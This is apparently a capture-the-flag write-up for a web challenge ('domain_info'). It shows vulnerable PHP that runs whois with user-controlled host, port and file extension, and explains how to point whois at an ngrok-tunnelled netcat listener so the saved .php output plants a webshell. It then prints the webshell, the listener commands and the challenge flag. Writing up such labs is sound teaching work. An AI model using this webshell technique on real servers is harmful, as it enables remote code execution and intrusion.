# domain_info

#### Category: Web Exploitation

#### Difficulty: Easy

#### Type: White Box

#### Description: Our team found an suspicious server which allows dns queries, find out how to exploit it. Ngrok could be helpful! Flag is : `/flag.txt`

#### Author: skyv3il

#### Files: [challenge.zip](https://github.com/emperorpenguincat/Public-Writeups/blob/main/UniVsThreats%20CTF%202025/domain_info/challenge.zip)

#### Preview:
![image](https://github.com/user-attachments/assets/dc750e76-388a-4a5b-b5c9-af43c96b95ff)

## Solution
<details>

The web-based challenge gave us a PHP source code and a webpage that had similar features to a WHOIS website. Firstly, we use simple queries to test out the web response to understand its behaviour.

![image](https://github.com/user-attachments/assets/7a2594fa-fe26-4256-9c65-0fc537586de7)

As we can see, a randomly generated filename containing the query response is kept in the '/uploads/' directory, and the website allows us to specify any file type extension we want to.

![image](https://github.com/user-attachments/assets/4003346f-4e69-40c1-afbf-4b83d0678f85)

However, the file's response has no relevant information, so let's examine the source code to identify the website's potential vulnerabilities.

### Source Code (PHP)

```php
<?php
function cleanUploads($path, $minutes = 2) {
    foreach (glob($path . "/*") as $file) {
        if (is_file($file) && (time() - filemtime($file)) > ($minutes * 60)) {
            unlink($file);
        }
    }
}

function randomString($length = 6) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, $length);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $host = $_POST['host'];
    $port = $_POST['port'];
    $query = $_POST['query'];
    $savefile = $_POST['savefile'];

    // Basic anti-command injection filters
    foreach ([$host, $port, $query, $savefile] as $input) {
        if (preg_match('/[;&|`$()<>]/', $input)) {
            die("<p style='color:red;'>❌ Command Injection Detected!</p>");
        }
    }

    // Extra simple validation
    if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_DOMAIN)) {
        die("<p style='color:red;'>❌ Invalid Hostname</p>");
    }

    // Safe escaping
    $host = escapeshellarg($host);
    $port = escapeshellarg($port);
    $query = escapeshellarg($query);

    // Create uploads folder if not exists
    $uploadDir = __DIR__ . '/uploads';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    // Cleanup old files
    cleanUploads($uploadDir, 2); // Delete files older than 2 minutes

    // Randomize file name
    if (empty($savefile)) {
        $savefile = "output.txt";
    }
    $randomPrefix = randomString();
    $finalName = $randomPrefix . "_" . basename($savefile);
    $savepath = $uploadDir . '/' . $finalName;

    // Execute
    $command = "whois -h " . $host . " -p " . $port . " " . $query  . " >  " . escapeshellarg($savepath);
    system($command);
    echo "Command: <pre>" . htmlspecialchars($command) . "</pre>";
    echo "<h2>✅ Whois Executed. Saved in:</h2>";
    echo "<pre>/uploads/" . htmlspecialchars($finalName) . "</pre>";
    echo "<p><a style='color:#00ffea;' href='/uploads/" . htmlspecialchars($finalName) . "' target='_blank'>Click here to view your file</a></p>";
}
?>
```

Based on the provided source code, we can observed that it prevents simple command injection by blacklisting shell characters using `preg_match()` and `escapeshellarg()` function to execute shell commands securely so direct command injection will be difficult. It also uses `filter_var()` to validate the host and variable `$command` where the query will be executed inside the `system()` function. Since the website accepts host and port, we can establish a simple reverse shell like this: 

#### Set up a ngrok TCP tunnel

*Note: To create TCP tunneling using ngrok, it is required to fill credit card info into your account but don't worry. It is still free.*

`ngrok tcp 1337`

Then, the ngrok application will assign us a random host IP address and port to which we can connect later.

#### Set up a netcat listener

`nc -lvnp 1337`

Before submitting the request, we need to configure the listener so that when the victim executes the query, it connects to our host.

#### Fill up the host and port provided by ngrok

We can send the request after completing the form, which looks like this. Ensure the file type is a `.php` so that the php webshell which will be injected later on can be recognized.

![image](https://github.com/user-attachments/assets/965a1089-0260-4c5d-b0c5-08125f58bb59)

When the request has been sent, the netcat connection will be established. We can see that string "test" were displayed which we specified earlier indicates that the connection is successful. 

![image](https://github.com/user-attachments/assets/231f603d-5fb5-4bbb-8fa6-a1b2c6e1341d)

Then, we can inject a simple PHP webshell: `<?php system($_GET['cmd'];)?>`. The webshell will allow us to use UNIX commands on the cmd parameter.

![image](https://github.com/user-attachments/assets/42a50d9d-df3e-4a2b-8ed9-cca4358eb3a0)

After successfully injected the webshell, we can access the file to view the output.

![image](https://github.com/user-attachments/assets/7d7d94fc-3833-4aec-a8c4-c692e2a4a324)

The php script's output indicated an error regarding the null argument because we did not specify any commands in the `?cmd` parameter.  This indicates that the command was successfully injected.

![image](https://github.com/user-attachments/assets/d31e6ea9-1e77-40e4-878a-14a1b37dbbb1)

We may now use UNIX commands in the `?cmd` argument and directory listing command such as `ls` to display the files on the server.  Although the challenge stated that the flag is stored in `/flag.txt`, employing this approach may provide greater flexibility and efficiency for future challenges in which the filename or path is not specified.

![image](https://github.com/user-attachments/assets/a08d6ed9-c5e4-4217-8a89-6f9b90c4068f)

Then, for the next steps, we can simply access the `/flag.txt` file to acquire the flag for the challenge.

![image](https://github.com/user-attachments/assets/bcf6fbc3-7431-45d7-a3c1-dca89b564344)

#### Flag
> UVT{M4l1c10us_Wh0_1s_C0mmand_4nd_upl0ad}

</details>
